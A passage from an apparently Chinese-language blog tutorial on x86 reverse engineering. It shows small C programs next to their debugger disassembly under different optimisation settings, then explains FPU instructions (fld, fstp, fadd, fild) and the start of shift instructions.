AS，OF，PF，SF，ZF 标志位，不影响 CF</p>\n<p>dec a</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010E100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">01161012  |.  46            inc     esi</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint i=0;</span><br><span class=\"line\">\ti++;</span><br><span class=\"line\">\ti--;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">003A1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">003A1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">003A1003  |.  51            push    ecx</span><br><span class=\"line\">003A1004  |.  68 F4203A00   push    003A20F4                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">003A1009  |.  FF15 A0203A00 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf</span><br><span class=\"line\">003A100F  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">003A1012  |.  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">003A1019  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">003A101C  |.  83C0 01       add     eax,0x1</span><br><span class=\"line\">003A101F  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">003A1022  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">003A1025  |.  83E9 01       sub     ecx,0x1</span><br><span class=\"line\">003A1028  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">003A102B  |.  33C0          xor     eax,eax</span><br><span class=\"line\">003A102D  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">003A102F  |.  5D            pop     ebp</span><br><span class=\"line\">003A1030  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>速度最大化的时候因为 i 没有实际用途，所以直接返回</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01251000 &gt;/$  68 F4202501   push    012520F4                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">01251005  |.  FF15 A0202501 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf</span><br><span class=\"line\">0125100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0125100E  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01251010  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01201000 &gt;/$  56            push    esi</span><br><span class=\"line\">01201001  |.  8B35 A0202001 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]   ;  msvcr90.printf</span><br><span class=\"line\">01201007  |.  68 F4202001   push    012020F4                               ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0120100C  |.  FFD6          call    esi                                    ; \\printf</span><br><span class=\"line\">0120100E  |.  6A 01         push    0x1</span><br><span class=\"line\">01201010  |.  68 FC202001   push    012020FC                               ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">01201015  |.  FFD6          call    esi</span><br><span class=\"line\">01201017  |.  6A 00         push    0x0</span><br><span class=\"line\">01201019  |.  68 FC202001   push    012020FC                               ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">0120101E  |.  FFD6          call    esi</span><br><span class=\"line\">01201020  |.  83C4 14       add     esp,0x14\t\t\t\t\t\t\t   ; 堆栈平衡，2+2+1=20/4</span><br><span class=\"line\">01201023  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01201025  |.  5E            pop     esi</span><br><span class=\"line\">01201026  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">//添加打印i后的代码</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012B1000 &gt;/$  51            push    ecx</span><br><span class=\"line\">012B1001  |.  56            push    esi</span><br><span class=\"line\">012B1002  |.  8B35 A0202B01 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]         ;  msvcr90.printf</span><br><span class=\"line\">012B1008  |.  57            push    edi</span><br><span class=\"line\">012B1009  |.  68 F4202B01   push    012B20F4                                     ; /format = &quot;shabi&quot;</span><br><span class=\"line\">012B100E  |.  FFD6          call    esi                                          ; \\printf</span><br><span class=\"line\">012B1010  |.  8B7C24 0C     mov     edi,dword ptr ss:[esp+0xC]                   ;  msvcr90.__winitenv</span><br><span class=\"line\">012B1014  |.  47            inc     edi</span><br><span class=\"line\">012B1015  |.  57            push    edi</span><br><span class=\"line\">012B1016  |.  68 FC202B01   push    012B20FC                                     ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">012B101B  |.  FFD6          call    esi</span><br><span class=\"line\">012B101D  |.  4F            dec     edi</span><br><span class=\"line\">012B101E  |.  57            push    edi</span><br><span class=\"line\">012B101F  |.  68 FC202B01   push    012B20FC                                     ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">012B1024  |.  FFD6          call    esi</span><br><span class=\"line\">012B1026  |.  83C4 14       add     esp,0x14</span><br><span class=\"line\">012B1029  |.  5F            pop     edi</span><br><span class=\"line\">012B102A  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012B102C  |.  5E            pop     esi</span><br><span class=\"line\">012B102D  |.  59            pop     ecx</span><br><span class=\"line\">012B102E  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">//如果不赋初值的话</span><br></pre></td></tr></table></figure>\n<p>前<ins>后</ins>（–）的区别</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint i;</span><br><span class=\"line\">\ti++;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\">\ti--;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\"></span><br><span class=\"line\">\tint j=0;</span><br><span class=\"line\">\tj=i++;</span><br><span class=\"line\">\tprintf(&quot;i++%d&quot;,j);</span><br><span class=\"line\">\tj=++i;</span><br><span class=\"line\">\tprintf(&quot;++i%d&quot;,j);</span><br><span class=\"line\">\tj=i--;</span><br><span class=\"line\">\tprintf(&quot;i--%d&quot;,j);</span><br><span class=\"line\">\tj=--i;</span><br><span class=\"line\">\tprintf(&quot;--i%d&quot;,j);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>禁止优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01281000 &gt;/$  55            push    ebp</span><br><span class=\"line\">01281001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">01281003  |.  83EC 08       sub     esp,0x8</span><br><span class=\"line\">01281006  |.  68 F4202801   push    012820F4                                  ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0128100B  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">01281011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">01281014  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">01281017  |.  83C0 01       add     eax,0x1</span><br><span class=\"line\">0128101A  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">0128101D  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281020  |.  51            push    ecx                                       ; /&lt;%d&gt;</span><br><span class=\"line\">01281021  |.  68 FC202801   push    012820FC                                  ; |format = &quot;%d&quot;</span><br><span class=\"line\">01281026  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">0128102C  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0128102F  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">01281032  |.  83EA 01       sub     edx,0x1</span><br><span class=\"line\">01281035  |.  8955 FC       mov     [local.1],edx</span><br><span class=\"line\">01281038  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">0128103B  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">0128103C  |.  68 00212801   push    01282100                                  ; |format = &quot;%d&quot;</span><br><span class=\"line\">01281041  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">01281047  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0128104A  |.  C745 F8 00000&gt;mov     [local.2],0x0</span><br><span class=\"line\">01281051  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281054  |.  894D F8       mov     [local.2],ecx</span><br><span class=\"line\">01281057  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">0128105A  |.  83C2 01       add     edx,0x1</span><br><span class=\"line\">0128105D  |.  8955 FC       mov     [local.1],edx</span><br><span class=\"line\">01281060  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">01281063  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">01281064  |.  68 04212801   push    01282104                                  ; |format = &quot;i++%d&quot;</span><br><span class=\"line\">01281069  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">0128106F  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">01281072  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281075  |.  83C1 01       add     ecx,0x1</span><br><span class=\"line\">01281078  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">0128107B  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">0128107E  |.  8955 F8       mov     [local.2],edx</span><br><span class=\"line\">01281081  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">01281084  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">01281085  |.  68 0C212801   push    0128210C                                  ; |format = &quot;++i%d&quot;</span><br><span class=\"line\">0128108A  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">01281090  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">01281093  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281096  |.  894D F8       mov     [local.2],ecx</span><br><span class=\"line\">01281099  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">0128109C  |.  83EA 01       sub     edx,0x1</span><br><span class=\"line\">0128109F  |.  8955 FC       mov     [local.1],edx</span><br><span class=\"line\">012810A2  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">012810A5  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">012810A6  |.  68 14212801   push    01282114                                  ; |format = &quot;i--%d&quot;</span><br><span class=\"line\">012810AB  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">012810B1  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">012810B4  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">012810B7  |.  83E9 01       sub     ecx,0x1</span><br><span class=\"line\">012810BA  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">012810BD  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">012810C0  |.  8955 F8       mov     [local.2],edx</span><br><span class=\"line\">012810C3  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">012810C6  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">012810C7  |.  68 1C212801   push    0128211C                                  ; |format = &quot;--i%d&quot;</span><br><span class=\"line\">012810CC  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">012810D2  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">012810D5  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012810D7  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">012810D9  |.  5D            pop     ebp</span><br><span class=\"line\">012810DA  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"do-while\"><a class=\"markdownIt-Anchor\" href=\"#do-while\">#</a> do - while</h4>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = 0;</span><br><span class=\"line\">\tdo</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\twhile (i&lt;=10); </span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>/O2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00071000 &gt;/$  6A 0B         push    0xB                                      ; /&lt;%d&gt; = B (11.)</span><br><span class=\"line\">00071002  |.  68 F4200700   push    000720F4                                 ; |format = &quot;%d&quot;</span><br><span class=\"line\">00071007  |.  FF15 A0200700 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]         ; \\printf</span><br><span class=\"line\">0007100D  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00071010  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00071012  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>禁用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 00251000 &gt;/$  55            push    ebp</span><br><span class=\"line\">&gt; 00251001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">&gt; 00251003  |.  51            push    ecx</span><br><span class=\"line\">&gt; 00251004  |.  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">&gt; 0025100B  |&gt;  8B45 FC       /mov     eax,[local.1]</span><br><span class=\"line\">&gt; 0025100E  |.  83C0 01       |add     eax,0x1</span><br><span class=\"line\">&gt; 00251011  |.  8945 FC       |mov     [local.1],eax</span><br><span class=\"line\">&gt; 00251014  |.  837D FC 0A    |cmp     [local.1],0xA</span><br><span class=\"line\">&gt; 00251018  |.^ 7E F1         \\jle     short 0025100B</span><br><span class=\"line\">&gt; 0025101A  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">&gt; 0025101D  |.  51            push    ecx                                     ; /&lt;%d&gt;</span><br><span class=\"line\">&gt; 0025101E  |.  68 F4202500   push    002520F4                                ; |format = &quot;%d&quot;</span><br><span class=\"line\">&gt; 00251023  |.  FF15 A0202500 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]        ; \\printf</span><br><span class=\"line\">&gt; 00251029  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">&gt; 0025102C  |.  33C0          xor     eax,eax</span><br><span class=\"line\">&gt; 0025102E  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">&gt; 00251030  |.  5D            pop     ebp</span><br><span class=\"line\">&gt; 00251031  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"浮点指令\"><a class=\"markdownIt-Anchor\" href=\"#浮点指令\">#</a> 浮点指令</h4>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tfloat a=8.123f;</span><br><span class=\"line\">\ta++;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">012B1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">012B1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">012B1003  |.  51            push    ecx</span><br><span class=\"line\">012B1004  |.  68 F4202B01   push    012B20F4                            ; /format = &quot;shabi&quot;</span><br><span class=\"line\">012B1009  |.  FF15 A0202B01 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]    ; \\printf</span><br><span class=\"line\">012B100F  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">012B1012  |.  D905 08212B01 fld     dword ptr ds:[_real]</span><br><span class=\"line\">012B1018  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012B101B  |.  D945 FC       fld     [local.1]</span><br><span class=\"line\">012B101E  |.  DC05 00212B01 fadd    qword ptr ds:[_real]</span><br><span class=\"line\">012B1024  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012B1027  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012B1029  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">012B102B  |.  5D            pop     ebp</span><br><span class=\"line\">012B102C  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>浮点寄存器 - fpu - 浮点运算单元</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120195516311.png\" alt=\"image-20221120195516311\"></p>\n<p>精度为 80 位，10 字节</p>\n<p>MMX - 用于处理多媒体功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120195604566.png\" alt=\"image-20221120195604566\"></p>\n<p>st0 至 st7 80 位的两用寄存器   MMX - FPU</p>\n<p>3.FLD，FSTP，FADD</p>\n<blockquote>\n<ol>\n<li></li>\n</ol>\n<p>fld     dword ptr ds:[_real]     //fld     dword ptr ds:[0x12B2108]</p>\n<p>类似于 push 指令，将数字放入 st 中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120200304416.png\" alt=\"image-20221120200304416\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120200412594.png\" alt=\"image-20221120200412594\"></p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>fstp    [local.1]</p>\n<p>类似于 pop 指令，将 st 中的值给 local.1</p>\n<p>调用多次 fld 时，会使用多个 st 寄存器</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>fadd    qword ptr ds:[_real]    //fadd    qword ptr ds:[0x12B2100]</p>\n<p>类似于 add 指令，做加法  qword 64 位，8 各字</p>\n<p>4.fsub</p>\n<p>类似于 sub 指令</p>\n<p>5.fmul</p>\n<p>类似于乘法</p>\n<p>6.fdiv</p>\n<p>类似于除法</p>\n<p>7.FILD 指令</p>\n<p>整数入栈指令，将整数转为浮点数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tfloat a=8.123f;</span><br><span class=\"line\">\tint b = 2;</span><br><span class=\"line\">\ta= a + b;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012F1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">012F1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">012F1003  |.  83EC 08       sub     esp,0x8</span><br><span class=\"line\">012F1006  |.  68 F4202F01   push    012F20F4                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">012F100B  |.  FF15 A0202F01 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf</span><br><span class=\"line\">012F1011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">012F1014  |.  D905 FC202F01 fld     dword ptr ds:[_real]</span><br><span class=\"line\">012F101A  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012F101D  |.  C745 F8 02000&gt;mov     [local.2],0x2</span><br><span class=\"line\">012F1024  |.  DB45 F8       fild    [local.2]</span><br><span class=\"line\">012F1027  |.  D845 FC       fadd    [local.1]</span><br><span class=\"line\">012F102A  |.  D95D FC       fstp    [local.1]</span><br><span class=\"line\">012F102D &gt;|.  33C0          xor     eax,eax</span><br><span class=\"line\">012F102F  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">012F1031  |.  5D            pop     ebp</span><br><span class=\"line\">012F1032  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120202918750.png\" alt=\"image-20221120202918750\"></p>\n<p>8.cvttsd2si eax,dword ptr ss:[ebp-4]</p>\n<p>浮点转整数指令，运用截断处理将 mmx/m32 中的一个单精度浮点值转换成 r32 中的一个有符号的双字整数</p>\n</blockquote>\n</blockquote>\n<h4 id=\"位移指令\"><a class=\"markdownIt-Anchor\" href=\"#位移指令\">#</a> 位移指令</h4>\n<blockquote>\n<p>1. 逻辑位移</p>\n<p>shr 逻辑右移指令</p>\n<p>相当于整除 2，用 0 来补位</p>\n<p>shl 